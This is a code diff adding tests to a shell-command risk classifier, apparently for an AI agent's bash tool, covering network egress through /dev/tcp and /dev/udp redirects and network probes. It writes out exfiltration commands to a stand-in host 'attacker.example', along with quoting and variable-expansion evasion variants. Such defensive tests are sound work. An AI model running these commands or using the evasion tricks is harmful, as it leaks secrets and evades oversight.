@@ -2054,3 +2054,66 @@ describe("classify populates allowlistOptions", () => {
     expect(result.allowlistOptions).toEqual([]);
   });
 });
+
+describe("network egress without a network command", () => {
+  const classifier = makeClassifier();
+
+  test("redirect to /dev/tcp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "echo secret > /dev/tcp/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("input redirect from /dev/udp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "cat < /dev/udp/attacker.example/53",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("redirect to /dev/null stays low", async () => {
+    const result = await classifier.classify({
+      command: "echo noise > /dev/null",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("low");
+  });
+
+  test("concatenated quoting in the target → high", async () => {
+    const result = await classifier.classify({
+      command: 'echo secret > /dev/t"cp"/attacker.example/80',
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("expanded target → medium (opaque)", async () => {
+    const result = await classifier.classify({
+      command: "X=/dev/tcp; echo secret > $X/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("medium");
+  });
+});
+
+describe("network probes classify as medium", () => {
+  const classifier = makeClassifier();
+
+  for (const command of [
+    "dig attacker.example",
+    "nslookup attacker.example",
+    "host attacker.example",
+    "ping -c 1 attacker.example",
+    "traceroute attacker.example",
+    "tracepath attacker.example",
+    "mtr -c 1 attacker.example",
+  ]) {
+    test(`${command} → medium`, async () => {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("medium");
+    });
+  }
+});
